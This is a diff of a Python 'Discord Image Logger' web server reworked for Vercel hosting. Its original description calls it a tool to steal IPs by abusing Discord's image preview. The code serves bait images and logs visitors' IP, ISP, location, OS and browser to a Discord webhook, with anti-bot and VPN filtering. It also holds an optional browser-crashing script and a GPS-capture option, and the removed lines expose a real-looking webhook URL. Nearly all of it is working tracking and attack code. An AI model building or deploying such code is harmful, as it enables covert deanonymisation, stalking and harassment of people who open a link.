@@ -1,70 +1,51 @@
-# Discord Image Logger
-# By Dexty | https://github.com/xdexty0
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import os
+import json
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "Dexty"
+__app__ = "blob"
+__description__ = "blobb"
+__version__ = "v1.0.0"
+__author__ = "Dealer"
+
+# Load from environment variables (set in Vercel)
+WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
+IMAGE_URL = os.getenv("IMAGE_URL", "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpeople.com%2Fthmb%2Fy7ftO1rfZWFpO5-MY-LO-_M1OPs%3D%2F1500x0%2Ffilters%3Ano_upscale()%3Amax_bytes(150000)%3Astrip_icc()%3Afocal(749x0%3A751x2)%2FKrispy-Kreme-110923-1-6c6e17073b1c4cc19c976565312f3a81.jpg&f=1&nofb=1&ipt=b6157cc815d132919d75a5b299bc33ef94d61901eca8d4cfd0b6d3d07743ca90")
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1438614880520245271/UTd2ZIbuqQipy1hopuL55_R_BdmF-fHI1Q-NZc651d8mq-Hpf2o4z2i3sODZEuED3CK7",
-    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpaperaccess.com%2Ffull%2F58329.jpg&f=1&nofb=1&ipt=07373629347dffe2f6bb12d0b5f51150573f605a48beda17897cca4a28cc6966", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "webhook": WEBHOOK_URL,
+    "image": IMAGE_URL,
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger",
+    "color": 0x00FFFF,
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "crashBrowser": False,
+    "accurateLocation": False,
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger",
+        "richMessage": True,
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -104,7 +85,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -137,7 +118,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 ping = ""
 
 
-    os, browser = httpagentparser.simple_detect(useragent)
+    os_name, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
     "username": config["username"],
@@ -164,7 +145,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** `{os}`
+> **OS:** `{os_name}`
 > **Browser:** `{browser}`
 
 **User Agent:**
@@ -181,9 +162,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -213,17 +191,20 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+            # Get IP from Vercel's header
+            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
+            
+            if ip.startswith(blacklistedIPs):
                 return
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+            if botCheck(ip, self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReport(ip, endpoint = s.split("?")[0], url = url)
                 
                 return
             
@@ -233,15 +214,15 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(ip, self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
 
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{ip}", ip)
                     message = message.replace("{isp}", result["isp"])
                     message = message.replace("{asn}", result["as"])
                     message = message.replace("{country}", result["country"])
@@ -262,13 +243,13 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/xdexty0
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
 
                 if config["accurateLocation"]:
                     data += b"""<script>
